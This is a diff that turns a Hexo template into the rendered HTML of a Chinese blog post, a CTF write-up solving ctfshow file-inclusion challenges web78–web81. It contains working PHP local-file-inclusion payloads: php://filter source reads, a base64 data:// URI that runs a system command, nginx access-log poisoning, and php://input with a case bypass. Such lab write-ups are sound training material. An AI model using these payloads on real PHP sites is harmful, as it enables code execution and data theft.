@@ -1,37 +1,398 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hackerone-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hackerone-16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="msvalidate.01" content="237E6FD4C952815B9A0DDB67FAB1FF12">
+  <meta name="baidu-site-verification" content="code-LhZrqnckkC">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"eur1ka.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="ctfshow（web78~web81） 文件包含入门前言：​             在这些题中用到了许多php伪协议，这里写两个做题中比较常用的，具体请看博客（(21条消息) PHP伪协议_H0ne的博客-CSDN博客_php伪协议） 1、php伪协议：data:&#x2F;&#x2F;碰到file_get_contents()，include（）来用； 个人感觉data比较万能所以再没有头绪">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含入门（web78~web81）">
+<meta property="og:url" content="https://eur1ka.github.io/2022/07/25/ctfshow_web78~web81/index.html">
+<meta property="og:site_name" content="Eureka&#39;s Blog">
+<meta property="og:description" content="ctfshow（web78~web81） 文件包含入门前言：​             在这些题中用到了许多php伪协议，这里写两个做题中比较常用的，具体请看博客（(21条消息) PHP伪协议_H0ne的博客-CSDN博客_php伪协议） 1、php伪协议：data:&#x2F;&#x2F;碰到file_get_contents()，include（）来用； 个人感觉data比较万能所以再没有头绪">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://eur1ka.github.io/ctfshow_web78~web81/image-20220724155731962.png">
+<meta property="og:image" content="https://eur1ka.github.io/ctfshow_web78~web81/image-20220724161603151.png">
+<meta property="og:image" content="https://eur1ka.github.io/ctfshow_web78~web81/image-20220724163900808.png">
+<meta property="og:image" content="https://eur1ka.github.io/ctfshow_web78~web81/image-20220724164056572.png">
+<meta property="og:image" content="https://eur1ka.github.io/ctfshow_web78~web81/image-20220724164233173.png">
+<meta property="og:image" content="https://eur1ka.github.io/ctfshow_web78~web81/image-20220725202045975.png">
+<meta property="article:published_time" content="2022-07-25T15:45:00.000Z">
+<meta property="article:modified_time" content="2022-07-25T15:44:56.466Z">
+<meta property="article:author" content="nnnpc、commit、Eureka">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://eur1ka.github.io/ctfshow_web78~web81/image-20220724155731962.png">
 
 
-{% block content %}
+<link rel="canonical" href="https://eur1ka.github.io/2022/07/25/ctfshow_web78~web81/">
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://eur1ka.github.io/2022/07/25/ctfshow_web78~web81/","path":"2022/07/25/ctfshow_web78~web81/","title":"文件包含入门（web78~web81）"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>文件包含入门（web78~web81） | Eureka's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Eureka's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">默安科技逐日实验室</p>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow%EF%BC%88web78-web81%EF%BC%89-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8"><span class="nav-number">1.</span> <span class="nav-text">ctfshow（web78~web81） 文件包含入门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web78"><span class="nav-number">1.2.</span> <span class="nav-text">web78</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web79"><span class="nav-number">1.3.</span> <span class="nav-text">web79</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web80-81"><span class="nav-number">1.4.</span> <span class="nav-text">web80-81</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web80%E7%9A%84%E7%AC%AC%E4%BA%8C%E7%A7%8D%E8%A7%A3%E6%B3%95%EF%BC%88php%EF%BC%9A-input%EF%BC%89"><span class="nav-number">1.5.</span> <span class="nav-text">web80的第二种解法（php：&#x2F;&#x2F;input）</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nnnpc、commit、Eureka"
+      src="/images/head.png">
+  <p class="site-author-name" itemprop="name">nnnpc、commit、Eureka</p>
+  <div class="site-description" itemprop="description">网络信息安全，责任重大，使命光荣。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:1695672857@qq.com" title="E-Mail → mailto:1695672857@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://eur1ka.github.io/2022/07/25/ctfshow_web78~web81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eureka's Blog">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="文件包含入门（web78~web81） | Eureka's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件包含入门（web78~web81）
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-25 23:45:00 / 修改时间：23:44:56" itemprop="dateCreated datePublished" datetime="2022-07-25T23:45:00+08:00">2022-07-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/ctfshow%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">ctfshow刷题</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="ctfshow（web78-web81）-文件包含入门"><a href="#ctfshow（web78-web81）-文件包含入门" class="headerlink" title="ctfshow（web78~web81） 文件包含入门"></a>ctfshow（web78~web81） 文件包含入门</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>​             在这些题中用到了许多php伪协议，这里写两个做题中比较常用的，具体请看博客（<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53142368/article/details/116594299">(21条消息) PHP伪协议_H0ne的博客-CSDN博客_php伪协议</a>）</p>
+<p>1、php伪协议：data:&#x2F;&#x2F;碰到file_get_contents()，include（）来用；</p>
+<p><strong>个人感觉data比较万能所以再没有头绪的时候可以尝试一下；</strong></p>
+<p>2、php:&#x2F;&#x2F;input （读取POST数据）</p>
+<p>碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
+<p>3、php:&#x2F;&#x2F;filter（本地磁盘文件进行读取）（filter:&#x2F;&#x2F; 感觉是遇到include()函数使用）</p>
+<p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</p>
+<ul>
+<li><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p>传输后获得一串base64加密过后的编码。解密即可；</p>
+<ul>
+<li><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题对输入进行了一定的过滤，即不能包含的url中不能直接出现php，可以使用data协议，进行base64加密即可</p>
+<p>​			payload:</p>
+<p>file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</p>
+<p>之后再查看器中进行查看；</p>
+<p><img src="/ctfshow_web78~web81/image-20220724155731962.png" alt="image-20220724155731962"></p>
+<ul>
+<li><h2 id="web80-81"><a href="#web80-81" class="headerlink" title="web80-81"></a>web80-81</h2></li>
+</ul>
+<p>循序渐进将data协议也禁止了，所以我们可以使用包含日志文件来获取flag</p>
+<p>（我们可以通过响应头获取有关中间件的信息，以此判断日志文件的路径）</p>
+<p><em><strong>tips:</strong></em></p>
+<p><strong>nginx日志在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong></p>
+<p><strong>apache日志在类似目录下&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//web80题目</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"> <span class="comment">//没有对输入进行限制和处理所以此处我们可以通过大小写绕过；</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>传输后发现日志中记载的是UA头，所以可以通过bp再UA头中构造语句获得flag</p>
+<p><img src="/ctfshow_web78~web81/image-20220724161603151.png" alt="image-20220724161603151"></p>
+<p>先查看文件</p>
+<p><img src="/ctfshow_web78~web81/image-20220724163900808.png" alt="image-20220724163900808"></p>
+<p>获取flag（至于这里为甚么用base64有点不明白，猜测：可能文件使用的是base64加密吧，不过使用vi和vim也可以获得flag）</p>
+<p><img src="/ctfshow_web78~web81/image-20220724164056572.png" alt="image-20220724164056572"></p>
+<p><img src="/ctfshow_web78~web81/image-20220724164233173.png" alt="image-20220724164233173"></p>
+<p>（两道题都可以使用这种日志包含的思路web81的具体过程就不在此具体赘述）</p>
+<h2 id="web80的第二种解法（php：-input）"><a href="#web80的第二种解法（php：-input）" class="headerlink" title="web80的第二种解法（php：&#x2F;&#x2F;input）"></a>web80的第二种解法（php：&#x2F;&#x2F;input）</h2><p>正如代码中注释所说我们可以利用大小写绕过后使用input协议，通过post传值进行命令执行</p>
+<p><img src="/ctfshow_web78~web81/image-20220725202045975.png" alt="image-20220725202045975"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/" rel="prev" title="2022DASCTF七月赋能赛">
+                  <i class="fa fa-angle-left"></i> 2022DASCTF七月赋能赛
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/" rel="next" title="bugku 秋名山车神">
+                  bugku 秋名山车神 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2022023783号-1 </a>
+  </div>
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">nnnpc、commit、Eureka</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
